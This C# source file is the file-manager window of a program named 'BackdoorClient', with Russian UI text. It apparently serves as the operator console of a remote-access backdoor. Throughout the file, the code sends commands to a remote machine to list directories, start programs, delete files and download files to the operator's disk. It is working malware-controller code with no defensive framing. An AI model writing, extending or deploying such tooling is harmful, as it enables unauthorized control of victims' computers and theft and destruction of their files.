using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;

namespace BackdoorClient
{
    public partial class FileManager : Form
    {
        public Form1 mainForm;
 
        public FileManager(Form1 form)
        {
            mainForm = form;
            InitializeComponent();
        }

        private void FileManager_Load(object sender, EventArgs e)
        {
            if (!mainForm.TestConnect())
            {
              
                this.Close();
                return;
            }
            RefreshFileMgr();
        }

        private void RefreshFileMgr()
        {
            XmlDocument doc = new XmlDocument();
            string docContent = mainForm.SendCommandAndGetResponce($"ls ${pathTextBox.Text}");

            doc.LoadXml(docContent);

            XmlNode root = doc.FirstChild;
            filesView.Nodes.Clear();
            if (root.HasChildNodes)
            {
                for (int i = 0; i < root.ChildNodes.Count; i++)
                {
                    filesView.Nodes.Add(root.ChildNodes[i].InnerText);
                }
            }
            statsLabel.Text = "Найдено: " + $"файлов и папок {filesView.Nodes.Count}";
        }

        private void startFileBut_Click(object sender, EventArgs e)
        {
            string s = $"start ${pathTextBox.Text + "/" + filesView.SelectedNode.Text.Remove(0,1)}";
            resulteText.Text = mainForm.SendCommandAndGetResponce(s);//$"start ${pathTextBox.Text + "/" + filesView.SelectedNode.Text}");
        }

        private void removeFileButton_Click(object sender, EventArgs e)
        {
            resulteText.Text = mainForm.SendCommandAndGetResponce($"rm ${pathTextBox.Text + "/" + filesView.SelectedNode.Text.Remove(0,1)}");
            RefreshFileMgr();
        }

        private void refreshFilesBut_Click(object sender, EventArgs e)
        {
            RefreshFileMgr();
        }

        private void downloadBut_Click(object sender, EventArgs e)
        {
            try
            {
                /*
                XmlDocument doc = new XmlDocument();
                string docContent = mainForm.SendCommandAndGetResponce($"download ${pathTextBox.Text + "/" + filesView.SelectedNode.Text.Remove(0, 1)}", 100000);
                if (docContent == "Не получилось скачать файл") return;

                var bytesForWrite = new byte[1000];
                var fname = "";

                doc.LoadXml(docContent);

                XmlNode root = doc.FirstChild;

                if (root.HasChildNodes)
                {
                    for (int i = 0; i < root.ChildNodes.Count; i++)
                    {
                        if (root.ChildNodes[i].Name == "fname")
                        {
                            fname = root.ChildNodes[i].InnerText;
                            break;
                        }
                    }
                    for (int i = 0; i < root.ChildNodes.Count; i++)
                    {
                        if (root.ChildNodes[i].Name == "bytesArr")
                        {
                            bytesForWrite = Encoding.UTF8.GetBytes(root.ChildNodes[i].InnerText);
                        }
                    }
                }
                */
                System.IO.File.WriteAllBytes(filesView.SelectedNode.Text.Remove(0, 1), mainForm.SendCommandAndGetBytesResponce($"download ${pathTextBox.Text + "/" + filesView.SelectedNode.Text.Remove(0, 1)}", 10000000));
            }
            catch
            {

            }
        }
    }
}
